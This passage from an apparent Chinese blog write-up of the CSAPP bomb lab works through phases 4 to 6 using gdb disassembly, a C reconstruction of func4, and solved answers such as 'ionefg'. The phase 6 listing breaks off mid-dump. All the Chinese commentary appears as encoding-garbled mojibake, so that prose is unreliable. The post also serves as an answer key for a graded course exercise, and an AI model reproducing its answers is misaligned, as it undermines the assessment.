ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> edx=<span class="hljs-number">14</span>, esi=<span class="hljs-number">0</span>, edi=x, eax, ecx;  <span class="hljs-comment">//è¿™é‡Œæ²¡æ¶‰åŠæŒ‡é’ˆæ“ä½œï¼Œå› æ­¤è®¾ä¸ºæ•´å‹è€Œä¸æ˜¯æŒ‡é’ˆã€‚</span><br>    eax = edx;<br>    eax = eax-esi;<br>    ecx = eax;<br>    ecx = sign(eax);  <span class="hljs-comment">//ecxå‚¨å­˜eaxçš„æ­£è´Ÿå·ï¼Œ1ä¸ºè´Ÿ0ä¸ºæ­£</span><br>    eax += ecx;<br>    eax /= <span class="hljs-number">2</span>;<br>    ecx = eax+esi;<br>    <span class="hljs-keyword">if</span>(ecx &lt;= edi)<br>    &#123;<br>        eax = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(ecx &gt;= edi)<br>        &#123;<br>            <span class="hljs-keyword">return</span> eax;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            esi = ecx+<span class="hljs-number">1</span>;<br>            eax = func4();<br>            eax = <span class="hljs-number">2</span>*eax + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span> eax;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>        edx = ecx<span class="hljs-number">-1</span>;<br>        eax = func4();<br>        eax = eax*<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">return</span> eax;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­ç®€åŒ–,è¿™é‡Œç”±äº<code>eax</code>çš„åˆå€¼æ˜¯2ï¼Œç”±æˆ‘ä»¬è¾“å…¥å†³å®šçš„å˜é‡æ˜¯<code>edi</code>ï¼Œç”±è§‚å¯Ÿè¿”å›å€¼å¯çŸ¥ï¼Œä¸<code>eax</code>çš„åˆå€¼æ— å…³ä¸”<code>eax</code>æ’éè´Ÿã€‚å› æ­¤æ‰€æœ‰ç”±ç§»ä½äº§ç”Ÿå‡ºæ¥çš„åˆ¤æ–­ç¬¦å·çš„<code>ecx</code>éƒ½ä¸º0ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// mä»£edxï¼Œnä»£esi</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> m=<span class="hljs-number">14</span>,<span class="hljs-type">int</span> n=<span class="hljs-number">0</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> val; <span class="hljs-comment">//ä»£ecx</span><br>    val = (m+n)/<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span>(val == x) <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(val &lt; x)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*func4(x,m,val+<span class="hljs-number">1</span>)+<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(val &gt; x)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*func4(x,val<span class="hljs-number">-1</span>,n);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½å¿«ä¹çš„åœ¨å¤–é¢å¥—ä¸€ä¸ªforå¾ªç¯å’Œä¸€ä¸ªif&#x3D;&#x3D;0æ¥åˆ¤æ–­ç­”æ¡ˆå•¦ğŸ˜ã€‚</p><p>æœ€ç»ˆç»“æœï¼š</p><p>0 0ï¼›1 0ï¼›3 0ï¼›7 0</p><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h3><p>è§£æä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_5:<br>=&gt; 0x0000000000401062 &lt;+0&gt;:     push   %rbx<br>   0x0000000000401063 &lt;+1&gt;:     sub    $0x20,%rsp<br>   0x0000000000401067 &lt;+5&gt;:     mov    %rdi,%rbx#%rbx=%rdi<br>   0x000000000040106a &lt;+8&gt;:     mov    %fs:0x28,%rax#è¿™é‡Œå®é™…ä¸Šæ˜¯è®¾ç½®äº†ä¸€ä¸ªCanary<br>   0x0000000000401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)#*(%rsp+0x18)=%rax<br>   0x0000000000401078 &lt;+22&gt;:    xor    %eax,%eax#%eax=0<br>   0x000000000040107a &lt;+24&gt;:    call   0x40131b &lt;string_length&gt;<br>   0x000000000040107f &lt;+29&gt;:    cmp    $0x6,%eax#è¦æ±‚ä¸€ä¸ªé•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²<br>   0x0000000000401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;<br>   0x0000000000401084 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;<br>   0x000000000040108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx#%ecx=%rbx+%raxï¼Œä¿ç•™ä½8ä½<br>   0x000000000040108f &lt;+45&gt;:    mov    %cl,(%rsp)#*ï¼ˆ%rspï¼‰=%cl<br>   0x0000000000401092 &lt;+48&gt;:    mov    (%rsp),%rdx#%rdx=*ï¼ˆ%rspï¼‰<br>   0x0000000000401096 &lt;+52&gt;:    and    $0xf,%edx#è·å–å½“å‰å­—ç¬¦åå››ä½ï¼Œè®¾ä¸º0xk<br>   0x0000000000401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx#%edx=*(%rdx+..)ä¿ç•™ä½8ä½ï¼Œä¿ç•™å%edx=0x4024bk<br>   0x00000000004010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)#*(%rsp+%rax+0x10)=%dlï¼Œ%dlä¹Ÿå°±æ˜¯%rdxä½8ä½0xk<br>   0x00000000004010a4 &lt;+66&gt;:    add    $0x1,%rax#%rax+=1<br>   0x00000000004010a8 &lt;+70&gt;:    cmp    $0x6,%rax#æ¯”è¾ƒ%raxä¸6<br>   0x00000000004010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;#ä¸ç­‰ï¼Œè·³å›+41<br>   0x00000000004010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)#ç›¸ç­‰ï¼Œ*(%rsp+0x16)=0<br>   0x00000000004010b3 &lt;+81&gt;:    mov    $0x40245e,%esi#%esi=0x40245e<br>   0x00000000004010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi#%rdi=%rsp+0x10<br>   0x00000000004010bd &lt;+91&gt;:    call   0x401338 &lt;strings_not_equal&gt;<br>   0x00000000004010c2 &lt;+96&gt;:    test   %eax,%eax#åˆ¤æ–­å­—ç¬¦æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰å³ç»“æŸã€‚<br>   0x00000000004010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;<br>   0x00000000004010c6 &lt;+100&gt;:   call   0x40143a &lt;explode_bomb&gt;<br>   0x00000000004010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)<br>   0x00000000004010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;<br>   0x00000000004010d2 &lt;+112&gt;:   mov    $0x0,%eax#%eax=0<br>   0x00000000004010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;<br>   0x00000000004010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax<br>   0x00000000004010de &lt;+124&gt;:   xor    %fs:0x28,%rax<br>   0x00000000004010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;<br>   0x00000000004010e9 &lt;+135&gt;:   call   0x400b30 &lt;__stack_chk_fail@plt&gt;<br>   0x00000000004010ee &lt;+140&gt;:   add    $0x20,%rsp<br>   0x00000000004010f2 &lt;+144&gt;:   pop    %rbx<br>   0x00000000004010f3 &lt;+145&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>åŒæ—¶è§£æç›¸å…³çš„å‡½æ•°<code>string_length</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function string_length:<br>=&gt; 0x000000000040131b &lt;+0&gt;:     cmpb   $0x0,(%rdi)#æ¯”è¾ƒ*(%rdi)ä¸0<br>   0x000000000040131e &lt;+3&gt;:     je     0x401332 &lt;string_length+23&gt;#ç›¸ç­‰ï¼Œç»“æŸ<br>   0x0000000000401320 &lt;+5&gt;:     mov    %rdi,%rdx#ä¸ç­‰ï¼Œ%rdx=%rdi<br>   0x0000000000401323 &lt;+8&gt;:     add    $0x1,%rdx#%rdx += 1<br>   0x0000000000401327 &lt;+12&gt;:    mov    %edx,%eax#%eax=%edx<br>   0x0000000000401329 &lt;+14&gt;:    sub    %edi,%eax#%eax -= %edi<br>   0x000000000040132b &lt;+16&gt;:    cmpb   $0x0,(%rdx)#æ¯”è¾ƒ*ï¼ˆ%rdxï¼‰å’Œ0<br>   0x000000000040132e &lt;+19&gt;:    jne    0x401323 &lt;string_length+8&gt;#ä¸ç­‰ï¼Œè·³å›<br>   0x0000000000401330 &lt;+21&gt;:    repz ret#ç›¸ç­‰ï¼Œè¿”å›<br>   0x0000000000401332 &lt;+23&gt;:    mov    $0x0,%eax<br>   0x0000000000401337 &lt;+28&gt;:    ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>ç»“åˆä¸¤æ®µä»£ç ï¼Œæˆ‘ä»¬å¾—åˆ°<code>string_length</code>å‡½æ•°çš„é€»è¾‘ï¼šä»æˆ‘ä»¬çš„è¾“å…¥<code>%rdi</code>ä¸­è¯»å–æ•°æ®ï¼Œè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼ˆè¿™é‡Œé€šè¿‡è¿ç»­+1åˆ¤æ–­æ˜¯å¦ä¸ºé›¶ä¹Ÿå°±æ˜¯ä¸ºç©ºæ¥åˆ¤æ–­æ˜¯å¦å‚¨å­˜å­—ç¬¦ï¼Œå…¶ä¸­çš„<code>%eax=%edx-%edi</code>å°±æ˜¯å­—ç¬¦ä¸²é•¿åº¦ï¼‰ã€‚åˆ¤æ–­<code>%eax</code>æ˜¯å¦ä¸º6è¯´æ˜ç­”æ¡ˆæ˜¯ä¸€ä¸ªé•¿åº¦ä¸º6çš„å­—ç¬¦ä¸²ã€‚</p><p>ä¸‹é¢å°†<code>%eax</code>ç½®é›¶åè·³è½¬åˆ°+41ç»§ç»­ã€‚ä¹‹åç»è¿‡å‡ æ­¥å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å­˜åˆ°<code>%rdx</code>ä¸­ï¼Œå¹¶åªæ”¹å˜äº†ä½4ä½ã€‚æ¯æ¬¡åˆ©ç”¨<code>%rax+1</code>å°†å‚¨å­˜åœ¨<code>0x4024bk</code>çš„å­—ç¬¦æˆªå–å¾—åˆ°æ¯”å¯¹å­—ç¬¦ä¸²ï¼Œè½¬åˆ°<code>%rsp+0x10-%rsp+0x15</code>å¤„ã€‚é‡æ–°å°†å­—ç¬¦ä¸²çš„é¦–åœ°å€<code>%rsp+0x10</code>èµ‹ç»™<code>%rdi</code>ä½œä¸º<code>strings_not_equal</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè°ƒç”¨è¯¥å‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function strings_not_equal:<br>=&gt; 0x0000000000401338 &lt;+0&gt;:     push   %r12<br>   0x000000000040133a &lt;+2&gt;:     push   %rbp<br>   0x000000000040133b &lt;+3&gt;:     push   %rbx<br>   0x000000000040133c &lt;+4&gt;:     mov    %rdi,%rbx#%rbxå‚¨å­˜ç¬¬ä¸€ä¸ªå‚æ•°<br>   0x000000000040133f &lt;+7&gt;:     mov    %rsi,%rbp<br>   0x0000000000401342 &lt;+10&gt;:    call   0x40131b &lt;string_length&gt;<br>   0x0000000000401347 &lt;+15&gt;:    mov    %eax,%r12d#%r12d=%eax=6<br>   0x000000000040134a &lt;+18&gt;:    mov    %rbp,%rdi#%rbpä¸ºç¬¬äºŒä¸ªå‚æ•°èµ‹ç»™%rdi<br>   0x000000000040134d &lt;+21&gt;:    call   0x40131b &lt;string_length&gt;<br>   0x0000000000401352 &lt;+26&gt;:    mov    $0x1,%edx#%edx=1<br>   0x0000000000401357 &lt;+31&gt;:    cmp    %eax,%r12d#æ­¤å¤„%eaxä¸ºç¬¬äºŒä¸ªå‚æ•°çš„é•¿åº¦ï¼Œè¿™å‡ æ­¥æ˜¯åˆ¤æ–­ä¸¤è€…æ˜¯å¦ç­‰é•¿ã€‚ä¸ç­‰é•¿è·³è½¬è¿”å›1.<br>   0x000000000040135a &lt;+34&gt;:    jne    0x40139b &lt;strings_not_equal+99&gt;<br>   0x000000000040135c &lt;+36&gt;:    movzbl (%rbx),%eax<br>   0x000000000040135f &lt;+39&gt;:    test   %al,%al<br>   0x0000000000401361 &lt;+41&gt;:    je     0x401388 &lt;strings_not_equal+80&gt;<br>   0x0000000000401363 &lt;+43&gt;:    cmp    0x0(%rbp),%al<br>   0x0000000000401366 &lt;+46&gt;:    je     0x401372 &lt;strings_not_equal+58&gt;<br>   0x0000000000401368 &lt;+48&gt;:    jmp    0x40138f &lt;strings_not_equal+87&gt;<br>   0x000000000040136a &lt;+50&gt;:    cmp    0x0(%rbp),%al<br>   0x000000000040136d &lt;+53&gt;:    nopl   (%rax)<br>   0x0000000000401370 &lt;+56&gt;:    jne    0x401396 &lt;strings_not_equal+94&gt;<br>   0x0000000000401372 &lt;+58&gt;:    add    $0x1,%rbx<br>   0x0000000000401376 &lt;+62&gt;:    add    $0x1,%rbp<br>   0x000000000040137a &lt;+66&gt;:    movzbl (%rbx),%eax<br>   0x000000000040137d &lt;+69&gt;:    test   %al,%al<br>   0x000000000040137f &lt;+71&gt;:    jne    0x40136a &lt;strings_not_equal+50&gt;<br>   0x0000000000401381 &lt;+73&gt;:    mov    $0x0,%edx<br>   0x0000000000401386 &lt;+78&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;<br>   0x0000000000401388 &lt;+80&gt;:    mov    $0x0,%edx<br>   0x000000000040138d &lt;+85&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;<br>   0x000000000040138f &lt;+87&gt;:    mov    $0x1,%edx<br>   0x0000000000401394 &lt;+92&gt;:    jmp    0x40139b &lt;strings_not_equal+99&gt;<br>   0x0000000000401396 &lt;+94&gt;:    mov    $0x1,%edx<br>   0x000000000040139b &lt;+99&gt;:    mov    %edx,%eax<br>   0x000000000040139d &lt;+101&gt;:   pop    %rbx<br>   0x000000000040139e &lt;+102&gt;:   pop    %rbp<br>   0x000000000040139f &lt;+103&gt;:   pop    %r12<br>   0x00000000004013a1 &lt;+105&gt;:   ret<br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>æ•´ä¸ªå‡½æ•°å…ˆæ¯”è¾ƒé•¿åº¦ï¼Œåé€šè¿‡å­—ç¬¦ä¸€ä¸€ä½¿ç”¨<code>test</code>æ¯”è¾ƒæ˜¯å¦ç›¸ç­‰ã€‚æ€»ä½“è€Œè¨€ä¸ç­‰è¿”å›1ï¼Œç›¸ç­‰è¿”å›0.</p><p>æ¯”è¾ƒæ‰€ç”¨çš„å‡½æ•°å‚¨å­˜åœ¨<code>%esi</code>ä¸­ï¼Œè€Œåˆ©ç”¨åœ°å€0x40245eï¼Œæˆ‘ä»¬è§£æå‡ºç”¨äºæ¯”è¾ƒçš„å­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) print (char*) 0x40245e<br>$1 = 0x40245e &quot;flyers&quot;<br></code></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬è§£æä½äº<code>0x4024b0</code>å¤„çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦æˆªå–å‡ºflyersçš„æºå­—ç¬¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) print (char*) 0x4024b0<br>$2 = 0x4024b0 &lt;array&gt; &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;<br></code></pre></td></tr></table></figure><p>è§‚å¯Ÿå¯å¾—ï¼Œè¦å‡‘é½flyersï¼Œéœ€è¦æºå­—ç¬¦ä¸²çš„indexä¸º9ã€15ã€14ã€5ã€6ã€7ã€‚è€Œæˆ‘ä»¬è¾“å…¥çš„å…­ä¸ªå­—ç¬¦éœ€è¦æ»¡è¶³ASCIIç çš„ä½4ä½è¦è¯‘å‡ºå¯¹åº”æ•°å­—ä½œä¸ºåç§»é‡ã€‚æŸ¥è¡¨å¯å¾—ç­”æ¡ˆä¸ºï¼š</p><p><strong>ionefg.</strong></p><h3 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h3><p>æœ€åä¸€å…³æ— ç–‘æ˜¯æœ€å¤æ‚çš„ä¸€å…³ï¼Œæºç çš„é‡éƒ½æ˜¯å·¨å¤§çš„ï¼š</p><p>å¾ˆé•¿ï¼Œä½†å…¶ä¸­çš„é€»è¾‘å¹¶ä¸å›°éš¾ï¼Œæˆ‘ä»¬åªéœ€è¦<del>äº¿ç‚¹</del>è€å¿ƒæ…¢æ…¢çœ‹å°±è¡Œï¼ˆï¼‰ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function phase_6:<br>=&gt; 0x00000000004010f4 &lt;+0&gt;:     push   %r14<br>   0x00000000004010f6 &lt;+2&gt;:     push   %r13<br>   0x00000000004010f8 &lt;+4&gt;:     push   %r12<br>   0x00000000004010fa &lt;+6&gt;:     push   %rbp<br>   0x00000000004010fb &lt;+7&gt;:     push   %rbx<br>   0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp<br>   0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13<br>   0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi<br>   0x0000000000401106 &lt;+18&gt;:    call   0x40145c &lt;read_six_numbers&gt;<br>   0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14#%r14=%rsp<br>   0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d#r12d=0<br>   0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp#%rbp=%r13<br>   0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax#%eax=*(%r13)ï¼Œç¬¬ä¸€ä¸ªæ•°<br>   0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax#%eax -= 1<br>   0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax#æ¯”è¾ƒ%eaxå’Œ5<br>   0x0000000000401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;#å°äºç­‰äºï¼Œç»§ç»­<br>   0x0000000000401123 &lt;+47&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d#%r12d += 1<br>   0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d#æ¯”è¾ƒ%r12dä¸6<br>   0x0000000000401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;#ç›¸ç­‰è·³è½¬<br>   0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx#ä¸ç­‰ï¼Œ%ebx=%r12d=1<br>   0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax#%rax=%ebx=%r12d<br>   0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax#%eax=%rsp+4%raxï¼Œç›¸å½“äºç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæ•°<br>   0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)#æ¯”è¾ƒ*(%rbp)ä¸%eax<br>   0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;#ä¸ç­‰ï¼Œç»§ç»­è¿è¡Œ<br>   0x0000000000401140 &lt;+76&gt;:    call   0x40143a &lt;explode_bomb&gt;<br>   0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx#%ebx +=1<br>   0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx#æ¯”è¾ƒ%ebxå’Œ5<br>   0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;#å°äºç­‰äºï¼Œè·³å›<br>   0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13#å¤§äº5ï¼Œ%r13=4<br>   0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;<br>   0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi<br>   0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax<br>   0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx<br>   0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx<br>   0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx#7-%raxï¼Œå°†ç»“æœæ”¾å›<br>   0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)<br>   0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax#ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæ•°<br>   0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax<br>   0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;<br>   0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi<br>   0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;<br>   0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx#ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹<br>   0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax<br>   0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax<br>   0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;<br>   0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;<br>   0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx<br>   0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)#èµ‹å€¼ä¸ºè¾“å…¥åºå·<br>   0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi<br>   0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi<br>   0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;<br>   0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx<br>   0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx<br>   0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;<br>   0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax<br>   0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx<br>   0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;<br>   0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx#ä¾æ¬¡åˆ¤åˆ«å°äº<br>   0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax<br>   0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi<br>   0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx<br>   0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx<br>   0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx)<br>   0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax<br>   0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax<br>   0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;<br>   0x00000000004011cd 